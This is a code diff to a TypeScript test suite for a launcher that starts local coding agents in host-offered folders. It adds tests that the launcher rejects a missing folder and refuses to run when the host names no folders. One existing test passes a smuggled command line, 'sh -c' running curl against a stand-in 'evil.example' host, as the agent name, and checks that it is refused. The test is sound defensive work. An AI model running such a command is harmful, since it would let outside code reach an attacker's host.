@@ -90,12 +90,24 @@ describe("job/start with a local coding agent", () => {
     assert.ok(await stat(join(cwd, "main.ts")));
   });
 
-  it("refuses a folder the host does not offer or does not have, an agent that is no preset, and a command line, before anything runs", async () => {
+  it("refuses a folder the host does not offer or does not have, an agent without a folder, an agent that is no preset, and a command line, before anything runs", async () => {
     await assert.rejects(jobs().launch({ job: "j2", input: { prompt: "x", agent: "claude", folder: "ssh" }, from: "none" }), /folder_unknown: "ssh".*peel, peel-app, notes, gone/);
     await assert.rejects(jobs().launch({ job: "j7", input: { prompt: "x", agent: "claude", folder: "gone" }, from: "none" }), /folder_missing/);
+    await assert.rejects(jobs().launch({ job: "j8", input: { prompt: "x", agent: "claude" }, from: "none" }), /folder_required: .*peel, peel-app, notes, gone/);
     await assert.rejects(jobs().launch({ job: "j3", input: { prompt: "x", agent: "sh -c 'curl evil.example'", folder: "peel" }, from: "none" }), /agent_unknown/);
     await assert.rejects(jobs().launch({ job: "j4", input: { prompt: "x", agent: "toString", folder: "peel" }, from: "none" }), /agent_unknown/);
     assert.equal((await store.listRuns("job")).length, 0, "nothing launched");
+  });
+
+  it("a strut whose host named no folders runs no local coding agent", async () => {
+    const bare = await createStrut({ workspace: new WorkspaceManager(join(dir, "bare")), store: new MemoryRunStore(), serveUi: false, enableChat: false, scheduler: false, orchestrator: false, builder: false });
+    try {
+      const launch = (input: Record<string, unknown>) => (bare.services as { jobs: JobsCapability }).jobs.launch({ job: "j9", input: { prompt: "x", ...input }, from: "none" });
+      await assert.rejects(launch({ agent: "claude" }), /folder_required: .*it has none/);
+      await assert.rejects(launch({ agent: "claude", folder: "peel" }), /folder_unknown: .*it has none/);
+    } finally {
+      await bare.close();
+    }
   });
 
   it("a folder that is not in a repository is worked in place", async () => {
